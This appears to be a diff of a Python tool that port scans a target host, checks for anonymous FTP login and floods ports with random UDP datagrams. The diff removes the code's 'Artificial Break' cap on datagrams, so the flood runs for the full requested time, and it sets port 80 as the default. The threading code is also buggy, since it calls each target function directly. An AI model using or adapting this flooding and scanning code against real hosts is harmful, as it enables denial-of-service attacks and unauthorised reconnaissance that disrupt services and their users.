@@ -6,16 +6,16 @@ import random
 import time
 import sys
 
-mailfront = ["Zofia", "Test", "Jack", "Alehandro", "Vladimir", "Boston", "Loquisha", "Mahogany", "Ferrari"]
-mailback = ["gmail.com", "yahoo.com", "hotmail.com"]
+mailfront = ["Zofia", "Test", "Jack", "Alehandro", "Vladimir", "Boston", "Loquisha", "Mahogany", "Ferrari", "Michigan", "August", "Ireland", "Government", "Alerter"]
+mailback = ["gmail.com", "yahoo.com", "hotmail.com", "gov.edu", "aol.com"]
 
 global flood_time
 global target_host 
 global target_Ports
 target_host = ""
-target_Ports = []
+target_Ports = ['80']
 flood_time = 0
-target_Ports.append("")
+#target_Ports.append(0)
 
 parser = argparse.ArgumentParser(usage = 'Host (-H) [TARGET-HOST], Ports for Scanning (-p) [TARGET-PORTS (ex. 21 125 80)], Anonymous FTP Login Query (-a) (No Args), UDP Flooding Enabled (-u 200) where 200 is total msgs sent')
 parser.add_argument("-H", "--Host", help = 'Give Target Host!', required = True)
@@ -23,40 +23,45 @@ parser.add_argument("-p", "--ports", nargs = '+', help = 'Give Target Port!')
 parser.add_argument("-a", "--Anon", action = 'store_true', help = 'Sets Anonymous FTP Query Mode')
 parser.add_argument("-u", "--flood", nargs = 1, help = 'Flood Host with random UDP Datagrams')
 args = parser.parse_args()
-
-if (((target_Ports[0]) == "") and ((args.Anon) == False) and ((args.flood) == "")): #Must use at least one of these
+target_host = args.Host
+if (type(args.ports) == int) or (type(args.ports) == list):
+    target_Ports = args.ports
+else:
+    print("Ports value malformed")
+    print(parser.usage)
+flood_time = args.flood
+print(args)
+if ((target_Ports[0]) == 0) and ((args.Anon) == False) and ((flood_time) == 0): #Must use at least one of these
     print("Missing Parameters!  Must use -u with some ports")
     print(parser.usage)
     exit(0)
-elif ((target_Ports[0]) == "") and ((args.flood) == True):
+elif ((target_Ports[0]) == 0) and ((flood_time) == 0):
     print("Must Select Ports for UDP Flooding with -p!")
     print(parser.usage)
     exit(0)
-else:
-    target_host = args.Host
-    target_Ports = args.ports
-    flood_time = args.flood
 
 def flood_host(host, portlist, flood_time):
     count = 0
     for port in portlist:
-        count = count + 1
-        tname = 't-'+str(count)
-        tname = threading.Thread(target = flood_port(host, port, flood_time))
-        tname.start()
+        while True:
+            count = count + 1
+            tname = 't-'+str(count)
+            tname = threading.Thread(target = flood_port(host, port, flood_time))
+            tname.start()
+            break
 
 def flood_port(host, port, flood_time):
     current_count = 0
     temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     random_data = bytes(random._urandom(512))
-    stop_time = int(time.time()) + flood_time
+    stop_time = int(time.time()) + int(flood_time[0])
     while True:
-        if ((stop_time) < (time.time())) or (current_count > 30): #Artificial Break
+        if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
             break
         else:
             pass
-        print("Datagram Sent")
-        temp_socket.sendto(random_data, (host, port))
+        print("Datagram Sent to "+host+" on Port "+str(port))
+        temp_socket.sendto(random_data, (host, int(port)))
         current_count = current_count + 1
 
 def query_Login(host):
@@ -122,19 +127,16 @@ def Port_Scan(target_host, target_Ports):
 
 def main():
     print("")
-    if ((flood_time) != 0):
-        tflood = threading.Thread(target = flood_host(target_host, target_Ports, flood_time))
-        tflood.start()
+    if (args.flood != None):
+        flood_host(target_host, target_Ports, flood_time)
     else:
         pass
     if (args.Anon == True):
-        tlogin = threading.Thread(target = query_Login(target_host))
-        tlogin = t3.start()
+        query_Login(target_host)
     else:
         pass
-    if ((target_Ports) != ""):
-        tscan = threading.Thread(target = Port_Scan(target_host, target_Ports))
-        tscan.start()
+    if (((target_Ports) != 0) and (args.flood == None)):
+        Port_Scan(target_host, target_Ports)
     else:
         pass
     print("All Done")
